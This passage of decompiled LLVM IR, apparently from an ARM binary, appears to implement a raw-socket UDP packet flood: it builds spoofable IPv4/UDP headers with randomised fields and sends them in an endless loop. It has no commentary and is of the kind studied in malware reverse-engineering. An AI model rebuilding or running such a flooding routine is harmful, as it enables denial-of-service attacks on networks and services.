  %v7_8f3c = call i32 @function_8570(i32 %v0_8f34, i32* %v6_8f3c, i32 5, i32 0)
  %v1_8f48 = urem i32 %v7_8f3c, 256
  store i32 %v1_8f48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f54 = load i32, i32* @r5, align 4
  store i32 %v0_8f54, i32* %r1.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
  %v5_8f60 = inttoptr i32 %v0_8f54 to i32*
  %v6_8f60 = call i32 @function_8570(i32 %v0_8f58, i32* %v5_8f60, i32 6, i32 65535)
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8f60, i32* %sb.global-to-local, align 4
  %v0_8f78 = load i32, i32* @r4, align 4
  store i32 %v0_8f78, i32* %r0.global-to-local, align 4
  %v4_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v5_8f7c = call i32 @function_8570(i32 %v0_8f78, i32* %v4_8f7c, i32 7, i32 65535)
  %v0_8f80 = load i32, i32* @r5, align 4
  store i32 %v0_8f80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8f7c, i32* @sl, align 4
  %v0_8f90 = load i32, i32* @r4, align 4
  store i32 %v0_8f90, i32* %r0.global-to-local, align 4
  %v4_8f94 = inttoptr i32 %v0_8f80 to i32*
  %v5_8f94 = call i32 @function_8570(i32 %v0_8f90, i32* %v4_8f94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fa0 = load i32, i32* @r5, align 4
  store i32 %v0_8fa0, i32* %r1.global-to-local, align 4
  store i32 %v5_8f94, i32* @r6, align 4
  %v0_8fa8 = load i32, i32* @r4, align 4
  store i32 %v0_8fa8, i32* %r0.global-to-local, align 4
  %v4_8fac = inttoptr i32 %v0_8fa0 to i32*
  %v5_8fac = call i32 @function_8570(i32 %v0_8fa8, i32* %v4_8fac, i32 1, i32 1)
  %v2_8fb8 = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_8fb8, i32* %r3.global-to-local, align 4
  %v1_8fbc = urem i32 %v5_8fac, 256
  store i32 %v1_8fbc, i32* %ip.global-to-local, align 4
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8fc8 = load i32, i32* @r4, align 4
  store i32 %v0_8fc8, i32* %r0.global-to-local, align 4
  %v5_8fd0 = inttoptr i32 %v0_8fc0 to i32*
  %v6_8fd0 = call i32 @function_8570(i32 %v0_8fc8, i32* %v5_8fd0, i32 25, i32 %v2_8fb8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8fe4 = call i32 @function_113bc(i32 2, i32 3, i32 17)
  store i32 %v3_8fe4, i32* %r0.global-to-local, align 4
  %v7_8fe8 = icmp eq i32 %v3_8fe4, -1
  store i1 %v7_8fe8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8fe4, i32* @fp, align 4
  br i1 %v7_8fe8, label %dec_label_pc_9388, label %dec_label_pc_8ff4

dec_label_pc_8ff4:                                ; preds = %dec_label_pc_8eac
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8ffc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8ffc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9010 = call i32 @function_11378(i32 %v3_8fe4, i32 0, i32 3, i32 %v6_8ffc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9010, i32* %r0.global-to-local, align 4
  %v7_9014 = icmp eq i32 %v5_9010, -1
  store i1 %v7_9014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9014, label %dec_label_pc_9380, label %dec_label_pc_901c

dec_label_pc_901c:                                ; preds = %dec_label_pc_8ff4
  %v0_901c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9028 = urem i32 %v0_901c, 65536
  store i32 %v3_9028, i32* %r2.global-to-local, align 4
  %v3_902c = icmp ugt i32 %v3_9028, 1459
  %v9_902c = icmp eq i32 %v3_9028, 1460
  store i1 %v9_902c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_902c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_901c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_901c, %bb
  %v0_9088 = phi i32 [ %v3_9028, %dec_label_pc_901c ], [ 1460, %bb ]
  store i32 %v7_8f04, i32* %r0.global-to-local, align 4
  %v0_9038 = load i32, i32* %sb.global-to-local, align 4
  %v3_9040 = urem i32 %v0_9038, 65536
  store i32 %v3_9040, i32* %ip.global-to-local, align 4
  %v0_9044 = load i32, i32* @r7, align 4
  %v2_9044 = icmp eq i32 %v0_9044, 0
  store i1 %v2_9044, i1* %cpsr_z.global-to-local, align 1
  %v0_9048 = load i32, i32* @sl, align 4
  %v3_9048 = mul i32 %v0_9048, 65536
  br i1 %v2_9044, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_9088, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_9078 = phi i32 [ %v3_9040, %bb48 ], [ %v0_9088, %bb49 ]
  %v3_9058 = urem i32 %v0_9048, 65536
  store i32 %v3_9058, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9060 = urem i32 %v7_8f04, 65536
  store i32 %v3_9060, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9044, label %.thread, label %dec_label_pc_9080

.thread:                                          ; preds = %bb50
  %v2_9074 = add nsw i32 %v1_9078, 28
  store i32 %v2_9074, i32* @sb, align 4
  %v2_9078 = add nsw i32 %v1_9078, 8
  store i32 %v2_9078, i32* @sl, align 4
  br label %dec_label_pc_91a4.preheader

dec_label_pc_9080:                                ; preds = %bb50
  %v1_9088 = add nuw nsw i32 %v0_9088, 28
  store i32 %v1_9088, i32* @sb, align 4
  %v1_908c = add nuw nsw i32 %v0_9088, 8
  store i32 %v1_908c, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9038, 256
  %v3_90a0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9038, 256
  %v4_90b0 = urem i32 %tmp52, 256
  %v5_90b0 = or i32 %v4_90b0, %v3_90a0
  store i32 %v5_90b0, i32* @r6, align 4
  store i32 %v3_9048, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_9088, 256
  %v3_90bc = and i32 %tmp53, 65280
  store i32 %v3_90bc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9048, 256
  %v3_90c0 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_908c, 256
  %v3_90c4 = and i32 %tmp55, 65280
  store i32 %v3_90c4, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_9088, 256
  %v4_90c8 = urem i32 %tmp56, 256
  %v5_90c8 = or i32 %v4_90c8, %v3_90bc
  store i32 %v5_90c8, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9048, 256
  %v4_90cc = urem i32 %tmp57, 256
  %v5_90cc = or i32 %v4_90cc, %v3_90c0
  store i32 %v5_90cc, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_908c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f04, 256
  %v3_90d4 = and i32 %tmp58, 65280
  store i32 %v3_90d4, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f04, 256
  %v4_90e4 = urem i32 %tmp59, 256
  %v5_90e4 = or i32 %v4_90e4, %v3_90d4
  store i32 %v5_90e4, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_913c = sext i8 %v5_8f00 to i32
  %sext6 = mul nuw i32 %v5_90c8, 65536
  %v4_9158 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_90cc, 65536
  %v7_918c = sdiv i32 %sext7, 65536
  %v1_914c = trunc i32 %v6_8f1c to i8
  %v3_918c = sext i16 %rev to i32
  br label %dec_label_pc_90ec

dec_label_pc_90ec:                                ; preds = %.thread9, %dec_label_pc_9080
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_90f8 = call i32 @function_11f24(i32 1510, i32 1)
  store i32 %v2_90f8, i32* %r0.global-to-local, align 4
  store i32 %v2_8ec8, i32* %r3.global-to-local, align 4
  %v3_9100 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9100, i32* %r1.global-to-local, align 4
  %v2_9104 = load i32, i32* @r4, align 4
  %v5_9104 = mul i32 %v2_9104, 4
  %v6_9104 = add i32 %v5_9104, %v2_8ec8
  %v7_9104 = inttoptr i32 %v6_9104 to i32*
  store i32 %v2_90f8, i32* %v7_9104, align 4
  %v0_9108 = load i32, i32* %r3.global-to-local, align 4
  %v1_9108 = load i32, i32* %r1.global-to-local, align 4
  %v4_9108 = mul i32 %v1_9108, 4
  %v5_9108 = add i32 %v4_9108, %v0_9108
  %v6_9108 = inttoptr i32 %v5_9108 to i32*
  %v7_9108 = load i32, i32* %v6_9108, align 4
  store i32 %v7_9108, i32* %r0.global-to-local, align 4
  %v1_910c = inttoptr i32 %v7_9108 to i8*
  %v2_910c = load i8, i8* %v1_910c, align 1
  %tmp = urem i8 %v2_910c, 16
  %v1_9110 = zext i8 %tmp to i32
  %v1_9114 = or i32 %v1_9110, 64
  store i32 %v1_9114, i32* %r3.global-to-local, align 4
  %v1_9118 = trunc i32 %v1_9114 to i8
  store i8 %v1_9118, i8* %v1_910c, align 1
  %v0_911c = load i32, i32* %r0.global-to-local, align 4
  %v1_911c = inttoptr i32 %v0_911c to i8*
  %v2_911c = load i8, i8* %v1_911c, align 1
  %v1_9120 = and i8 %v2_911c, -16
  %v1_9124 = or i8 %v1_9120, 5
  store i32 %v1_8f48, i32* %ip.global-to-local, align 4
  %v0_912c = load i32, i32* %r1.global-to-local, align 4
  %v3_912c = mul i32 %v0_912c, 32
  store i32 %v3_912c, i32* %r2.global-to-local, align 4
  store i8 %v1_9124, i8* %v1_911c, align 1
  %v0_9134 = load i32, i32* %r1.global-to-local, align 4
  %v1_9134 = add i32 %v0_9134, 1
  store i32 %v1_9134, i32* @r4, align 4
  %v0_9138 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9134, -8
  %v5_9138 = add i32 %v0_9138, %tmp61
  store i32 %v5_9138, i32* %r2.global-to-local, align 4
  store i32 %v4_913c, i32* %r1.global-to-local, align 4
  %v2_9140 = load i32, i32* %r0.global-to-local, align 4
  %v3_9140 = add i32 %v2_9140, 1
  %v4_9140 = inttoptr i32 %v3_9140 to i8*
  store i8 %v5_8f00, i8* %v4_9140, align 1
  store i32 %v1_8f24, i32* %r3.global-to-local, align 4
  %v0_9148 = load i32, i32* %ip.global-to-local, align 4
  %v2_9148 = icmp eq i32 %v0_9148, 0
  store i1 %v2_9148, i1* %cpsr_z.global-to-local, align 1
  %v2_914c = load i32, i32* %r0.global-to-local, align 4
  %v3_914c = add i32 %v2_914c, 8
  %v4_914c = inttoptr i32 %v3_914c to i8*
  store i8 %v1_914c, i8* %v4_914c, align 1
  %v0_9150 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9150, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_90ec
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9154 = load i32, i32* %r0.global-to-local, align 4
  %v4_9154 = add i32 %v3_9154, 6
  %v5_9154 = inttoptr i32 %v4_9154 to i16*
  store i16 64, i16* %v5_9154, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_90ec, %bb60
  store i32 %v4_9158, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_9160 = load i32, i32* %r0.global-to-local, align 4
  %v3_9160 = add i32 %v2_9160, 9
  %v4_9160 = inttoptr i32 %v3_9160 to i8*
  store i8 17, i8* %v4_9160, align 1
  %v0_9164 = load i32, i32* %ip.global-to-local, align 4
  %v1_9164 = trunc i32 %v0_9164 to i16
  %v2_9164 = load i32, i32* %r0.global-to-local, align 4
  %v3_9164 = add i32 %v2_9164, 2
  %v4_9164 = inttoptr i32 %v3_9164 to i16*
  store i16 %v1_9164, i16* %v4_9164, align 2
  store i32 %v6_8fd0, i32* %ip.global-to-local, align 4
  %v1_916c = load i32, i32* %r0.global-to-local, align 4
  %v2_916c = add i32 %v1_916c, 12
  %v3_916c = inttoptr i32 %v2_916c to i32*
  store i32 %v6_8fd0, i32* %v3_916c, align 4
  %v0_9170 = load i32, i32* %r2.global-to-local, align 4
  %v1_9170 = load i32, i32* @r8, align 4
  %v2_9170 = add i32 %v1_9170, %v0_9170
  store i32 %v2_9170, i32* %r2.global-to-local, align 4
  %v1_9174 = add i32 %v2_9170, 16
  %v2_9174 = inttoptr i32 %v1_9174 to i32*
  %v3_9174 = load i32, i32* %v2_9174, align 4
  store i32 %v3_9174, i32* %r3.global-to-local, align 4
  %v0_9178 = load i32, i32* @r5, align 4
  %v1_9178 = trunc i32 %v0_9178 to i16
  %v2_9178 = load i32, i32* %r0.global-to-local, align 4
  %v3_9178 = add i32 %v2_9178, 4
  %v4_9178 = inttoptr i32 %v3_9178 to i16*
  store i16 %v1_9178, i16* %v4_9178, align 2
  %v0_917c = load i32, i32* %r0.global-to-local, align 4
  %v1_917c = add i32 %v0_917c, 20
  store i32 %v1_917c, i32* %r1.global-to-local, align 4
  %v0_9180 = load i32, i32* %r3.global-to-local, align 4
  %v2_9180 = add i32 %v0_917c, 16
  %v3_9180 = inttoptr i32 %v2_9180 to i32*
  store i32 %v0_9180, i32* %v3_9180, align 4
  %v0_9184 = load i32, i32* @r6, align 4
  %v1_9184 = trunc i32 %v0_9184 to i16
  %v2_9184 = load i32, i32* %r0.global-to-local, align 4
  %v3_9184 = add i32 %v2_9184, 20
  %v4_9184 = inttoptr i32 %v3_9184 to i16*
  store i16 %v1_9184, i16* %v4_9184, align 2
  store i32 %v3_918c, i32* %r0.global-to-local, align 4
  store i32 %v7_918c, i32* %r3.global-to-local, align 4
  %v0_9190 = load i32, i32* @r4, align 4
  %v1_9190 = load i32, i32* @r7, align 4
  %v9_9190 = icmp eq i32 %v0_9190, %v1_9190
  store i1 %v9_9190, i1* %cpsr_z.global-to-local, align 1
  %v2_9194 = load i32, i32* %r1.global-to-local, align 4
  %v3_9194 = add i32 %v2_9194, 4
  %v4_9194 = inttoptr i32 %v3_9194 to i16*
  store i16 %rev, i16* %v4_9194, align 2
  %v0_9198 = load i32, i32* %r3.global-to-local, align 4
  %v1_9198 = trunc i32 %v0_9198 to i16
  %v2_9198 = load i32, i32* %r1.global-to-local, align 4
  %v3_9198 = add i32 %v2_9198, 2
  %v4_9198 = inttoptr i32 %v3_9198 to i16*
  store i16 %v1_9198, i16* %v4_9198, align 2
  %v0_919c = load i32, i32* @r4, align 4
  store i32 %v0_919c, i32* %stack_var_-44, align 4
  %v5_91a0 = icmp slt i32 %v0_9190, %v1_9190
  br i1 %v5_91a0, label %dec_label_pc_90ec, label %dec_label_pc_91a4.preheader.loopexit

dec_label_pc_91a4.preheader.loopexit:             ; preds = %.thread9
  %v0_91a8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91a4.preheader

dec_label_pc_91a4.preheader:                      ; preds = %.thread, %dec_label_pc_91a4.preheader.loopexit
  %v0_91a8.pre = phi i32 [ %v0_91a8.pre.pre, %dec_label_pc_91a4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9310 = icmp eq i32 %v6_8fd0, -1
  %v8_9310 = icmp eq i32 %v6_8fd0, -1
  %v3_9328 = icmp eq i32 %v3_9060, 65535
  %v2_9364 = icmp eq i32 %v1_8fbc, 0
  br label %dec_label_pc_91a4

dec_label_pc_91a4:                                ; preds = %dec_label_pc_91a4, %dec_label_pc_92a4, %dec_label_pc_91a4.preheader
  %v0_91a8 = phi i32 [ %v0_91a8.pre, %dec_label_pc_91a4.preheader ], [ 0, %dec_label_pc_92a4 ], [ 0, %dec_label_pc_91a4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91a8 = icmp eq i32 %v0_91a8, 0
  store i1 %v2_91a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91a8, label %dec_label_pc_91a4, label %dec_label_pc_91b4

dec_label_pc_91b4:                                ; preds = %dec_label_pc_91a4, %dec_label_pc_92a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91b8

dec_label_pc_91b8:                                ; preds = %dec_label_pc_9220, %dec_label_pc_91b4
  %v1_91cc = phi i32 [ %v1_9294, %dec_label_pc_9220 ], [ 0, %dec_label_pc_91b4 ]
  %v5_91bc = mul i32 %v1_91cc, 24
  %v1_91c0 = load i32, i32* @r8, align 4
  %v2_91c0 = add i32 %v1_91c0, %v5_91bc
  store i32 %v2_91c0, i32* %r3.global-to-local, align 4
  store i32 %v2_8ec8, i32* %r1.global-to-local, align 4
  %v1_91c8 = add i32 %v2_91c0, 20
  %v2_91c8 = inttoptr i32 %v1_91c8 to i8*
  %v3_91c8 = load i8, i8* %v2_91c8, align 1
  %v4_91c8 = zext i8 %v3_91c8 to i32
  store i32 %v4_91c8, i32* %r2.global-to-local, align 4
  %v4_91cc = mul i32 %v1_91cc, 4
  %v5_91cc = add i32 %v4_91cc, %v2_8ec8
  %v6_91cc = inttoptr i32 %v5_91cc to i32*
  %v7_91cc = load i32, i32* %v6_91cc, align 4
  store i32 %v7_91cc, i32* @r5, align 4
  %v7_91d0 = icmp eq i8 %v3_91c8, 31
  store i1 %v7_91d0, i1* %cpsr_z.global-to-local, align 1
  %v1_91d4 = add i32 %v7_91cc, 20
  store i32 %v1_91d4, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_91c8, 32
  br i1 %tmp62, label %dec_label_pc_92b8, label %dec_label_pc_91dc

dec_label_pc_91dc:                                ; preds = %dec_label_pc_91b8
  store i32 %v6_8fd0, i32* %r3.global-to-local, align 4
  store i1 %v8_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9310, label %dec_label_pc_9318, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_92b8, %dec_label_pc_91dc
  store i32 %v3_9060, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9328, label %dec_label_pc_9334, label %dec_label_pc_91fc

dec_label_pc_91fc:                                ; preds = %dec_label_pc_9318.dec_label_pc_91fc_crit_edge, %dec_label_pc_91e8
  %v1_9200 = phi i32 [ %v1_9200.pre, %dec_label_pc_9318.dec_label_pc_91fc_crit_edge ], [ 65535, %dec_label_pc_91e8 ]
  store i32 %v3_9040, i32* %r0.global-to-local, align 4
  %v9_9200 = icmp eq i32 %v3_9040, %v1_9200
  store i1 %v9_9200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9200, label %dec_label_pc_9348, label %dec_label_pc_9208

dec_label_pc_9208:                                ; preds = %dec_label_pc_9334, %dec_label_pc_91fc
  %v1_920c = phi i32 [ %v1_9340, %dec_label_pc_9334 ], [ %v1_9200, %dec_label_pc_91fc ]
  store i32 %v3_9058, i32* %r1.global-to-local, align 4
  %v9_920c = icmp eq i32 %v3_9058, %v1_920c
  store i1 %v9_920c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_920c, label %dec_label_pc_935c, label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_9348, %dec_label_pc_9208
  store i32 %v1_8fbc, i32* %r3.global-to-local, align 4
  store i1 %v2_9364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9364, label %dec_label_pc_9220, label %dec_label_pc_9370

dec_label_pc_9220:                                ; preds = %dec_label_pc_9214, %dec_label_pc_935c, %dec_label_pc_9370
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9224 = load i32, i32* @r5, align 4
  %v3_9224 = add i32 %v2_9224, 10
  %v4_9224 = inttoptr i32 %v3_9224 to i16*
  store i16 0, i16* %v4_9224, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_922c = load i32, i32* @r5, align 4
  store i32 %v0_922c, i32* @r0, align 4
  %v2_9230 = call i32 @function_c848(i32 %v0_922c, i32 20)
  %v3_9230 = trunc i32 %v2_9230 to i16
  %v3_9234 = load i32, i32* @r5, align 4
  %v4_9234 = add i32 %v3_9234, 10
  %v5_9234 = inttoptr i32 %v4_9234 to i16*
  store i16 %v3_9230, i16* %v5_9234, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_923c = load i32, i32* @r6, align 4
  %v3_923c = add i32 %v2_923c, 6
  %v4_923c = inttoptr i32 %v3_923c to i16*
  store i16 0, i16* %v4_923c, align 2
  %v0_9240 = load i32, i32* @r6, align 4
  store i32 %v0_9240, i32* @r1, align 4
  %v1_9244 = add i32 %v0_9240, 4
  %v2_9244 = inttoptr i32 %v1_9244 to i16*
  %v3_9244 = load i16, i16* %v2_9244, align 2
  %v4_9244 = zext i16 %v3_9244 to i32
  store i32 %v4_9244, i32* %r2.global-to-local, align 4
  %v0_9248 = load i32, i32* @sl, align 4
  store i32 %v0_9248, i32* %r3.global-to-local, align 4
  %v0_924c = load i32, i32* @r5, align 4
  store i32 %v0_924c, i32* %r0.global-to-local, align 4
  %v4_9250 = call i32 @function_c898(i32 %v0_924c, i32 %v0_9240, i32 %v4_9244, i32 %v0_9248)
  %v5_9250 = trunc i32 %v4_9250 to i16
  store i32 %v4_9250, i32* %r0.global-to-local, align 4
  %v3_9254 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9254, i32* %r3.global-to-local, align 4
  %v3_9258 = mul i32 %v3_9254, 32
  store i32 %v3_9258, i32* %lr.global-to-local, align 4
  %v3_925c = load i32, i32* @r6, align 4
  %v4_925c = add i32 %v3_925c, 6
  %v5_925c = inttoptr i32 %v4_925c to i16*
  store i16 %v5_9250, i16* %v5_925c, align 2
  %v0_9260 = load i32, i32* %lr.global-to-local, align 4
  %v1_9260 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_9260, -8
  %v5_9260 = add i32 %v0_9260, %tmp63
  store i32 %v5_9260, i32* %lr.global-to-local, align 4
  %v0_9264 = load i32, i32* @r6, align 4
  %v1_9264 = add i32 %v0_9264, 2
  %v2_9264 = inttoptr i32 %v1_9264 to i16*
  %v3_9264 = load i16, i16* %v2_9264, align 2
  %v1_9268 = load i32, i32* @r8, align 4
  %v2_9268 = add i32 %v1_9268, %v5_9260
  store i32 %v2_9268, i32* @lr, align 4
  %v3_926c = add i32 %v2_9268, 2
  %v4_926c = inttoptr i32 %v3_926c to i16*
  store i16 %v3_9264, i16* %v4_926c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9278 = load i32, i32* @r5, align 4
  store i32 %v0_9278, i32* %r1.global-to-local, align 4
  %v0_927c = load i32, i32* @fp, align 4
  store i32 %v0_927c, i32* %r0.global-to-local, align 4
  %v0_9280 = load i32, i32* @sb, align 4
  store i32 %v0_9280, i32* %r2.global-to-local, align 4
  %v0_9284 = load i32, i32* @lr, align 4
  %v6_928c = call i32 @function_11338(i32 %v0_927c, i32 %v0_9278, i32 %v0_9280, i32 16384, i32 %v0_9284, i32 16)
  %v3_9290 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9290, i32* %r3.global-to-local, align 4
  %v1_9294 = add i32 %v3_9290, 1
  store i32 %v1_9294, i32* %r0.global-to-local, align 4
  %v1_9298 = load i32, i32* @r7, align 4
  %v9_9298 = icmp eq i32 %v1_9294, %v1_9298
  store i1 %v9_9298, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9294, i32* %stack_var_-44, align 4
  %v5_92a0 = icmp slt i32 %v1_9294, %v1_9298
  br i1 %v5_92a0, label %dec_label_pc_91b8, label %dec_label_pc_92a4

dec_label_pc_92a4:                                ; preds = %dec_label_pc_9220
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92a8 = icmp eq i32 %v1_9298, 0
  store i1 %v2_92a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92a8, label %dec_label_pc_91a4, label %dec_label_pc_91b4

dec_label_pc_92b8:                                ; preds = %dec_label_pc_91b8
  %v1_92b8 = add i32 %v2_91c0, 16
  %v2_92b8 = inttoptr i32 %v1_92b8 to i32*
  %v3_92b8 = load i32, i32* %v2_92b8, align 4
  %v0_92bc = call i32 @function_e094()
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v3_92c0 = load i32, i32* %stack_var_-44, align 4
  %v5_92c8 = mul i32 %v3_92c0, 24
  %v1_92cc = and i32 %v3_92b8, 16711680
  store i32 %v1_92cc, i32* %ip.global-to-local, align 4
  %v3_92d0 = udiv i32 %v3_92b8, 16777216
  %v4_92d4 = udiv i32 %v1_92cc, 256
  %v5_92d4 = or i32 %v4_92d4, %v3_92d0
  store i32 %v5_92d4, i32* %r2.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r8, align 4
  %v2_92d8 = add i32 %v1_92d8, %v5_92c8
  store i32 %v2_92d8, i32* %r1.global-to-local, align 4
  %v1_92dc = and i32 %v3_92b8, 65280
  store i32 %v1_92dc, i32* %r3.global-to-local, align 4
  %v1_92e0 = add i32 %v2_92d8, 20
  %v2_92e0 = inttoptr i32 %v1_92e0 to i8*
  %v3_92e0 = load i8, i8* %v2_92e0, align 1
  %v4_92e0 = zext i8 %v3_92e0 to i32
  store i32 %v4_92e0, i32* %ip.global-to-local, align 4
  %v5_92e8 = call i32 @llvm.bswap.i32(i32 %v3_92b8)
  %v7_92ec = lshr i32 %v0_92bc, %v4_92e0
  %v8_92ec = add i32 %v7_92ec, %v5_92e8
  store i32 %v8_92ec, i32* %r2.global-to-local, align 4
  %v1_92f0 = and i32 %v8_92ec, 16711680
  store i32 %v1_92f0, i32* %r0.global-to-local, align 4
  %v1_92fc = and i32 %v8_92ec, 65280
  store i32 %v1_92fc, i32* %r1.global-to-local, align 4
  %v5_9304 = call i32 @llvm.bswap.i32(i32 %v8_92ec)
  %v1_9308 = load i32, i32* @r5, align 4
  %v2_9308 = add i32 %v1_9308, 16
  %v3_9308 = inttoptr i32 %v2_9308 to i32*
  store i32 %v5_9304, i32* %v3_9308, align 4
  store i32 %v6_8fd0, i32* %r3.global-to-local, align 4
  store i1 %v8_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9310, label %dec_label_pc_9318, label %dec_label_pc_91e8

dec_label_pc_9318:                                ; preds = %dec_label_pc_92b8, %dec_label_pc_91dc
  %v0_9318 = call i32 @function_e094()
  store i32 %v0_9318, i32* %r0.global-to-local, align 4
  store i32 %v3_9060, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9328, i1* %cpsr_z.global-to-local, align 1
  %v1_932c = load i32, i32* @r5, align 4
  %v2_932c = add i32 %v1_932c, 12
  %v3_932c = inttoptr i32 %v2_932c to i32*
  store i32 %v0_9318, i32* %v3_932c, align 4
  br i1 %v3_9328, label %dec_label_pc_9334, label %dec_label_pc_9318.dec_label_pc_91fc_crit_edge

dec_label_pc_9318.dec_label_pc_91fc_crit_edge:    ; preds = %dec_label_pc_9318
  %v1_9200.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_91fc

dec_label_pc_9334:                                ; preds = %dec_label_pc_9318, %dec_label_pc_91e8
  %v0_9334 = call i32 @function_e094()
  %v1_9334 = trunc i32 %v0_9334 to i16
  %v3_9338 = load i32, i32* @r5, align 4
  %v4_9338 = add i32 %v3_9338, 4
  %v5_9338 = inttoptr i32 %v4_9338 to i16*
  store i16 %v1_9334, i16* %v5_9338, align 2
  store i32 %v3_9040, i32* %r0.global-to-local, align 4
  %v1_9340 = load i32, i32* @r4, align 4
  %v9_9340 = icmp eq i32 %v3_9040, %v1_9340
  store i1 %v9_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9340, label %dec_label_pc_9348, label %dec_label_pc_9208

dec_label_pc_9348:                                ; preds = %dec_label_pc_9334, %dec_label_pc_91fc
  %v0_9348 = call i32 @function_e094()
  %v1_9348 = trunc i32 %v0_9348 to i16
  store i32 %v0_9348, i32* %r0.global-to-local, align 4
  store i32 %v3_9058, i32* %r1.global-to-local, align 4
  %v1_9350 = load i32, i32* @r4, align 4
  %v9_9350 = icmp eq i32 %v3_9058, %v1_9350
  store i1 %v9_9350, i1* %cpsr_z.global-to-local, align 1
  %v3_9354 = load i32, i32* @r5, align 4
  %v4_9354 = add i32 %v3_9354, 20
  %v5_9354 = inttoptr i32 %v4_9354 to i16*
  store i16 %v1_9348, i16* %v5_9354, align 2
  br i1 %v9_9350, label %dec_label_pc_935c, label %dec_label_pc_9214

